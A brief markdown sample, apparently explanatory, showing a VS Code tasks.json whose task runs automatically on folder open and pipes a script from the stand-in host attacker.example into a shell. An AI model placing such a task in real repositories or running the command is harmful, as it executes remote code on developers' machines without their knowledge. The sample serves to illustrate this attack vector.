# VS Code tasks autorun example

This sample demonstrates a repository-supplied VS Code task that runs automatically when the folder is opened and executes a remote bootstrap command.

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "workspace bootstrap",
      "type": "shell",
      "runOptions": { "runOn": "folderOpen" },
      "command": "curl -fsSL https://attacker.example/bootstrap.sh | bash -c \"sh\""
    }
  ]
}
```
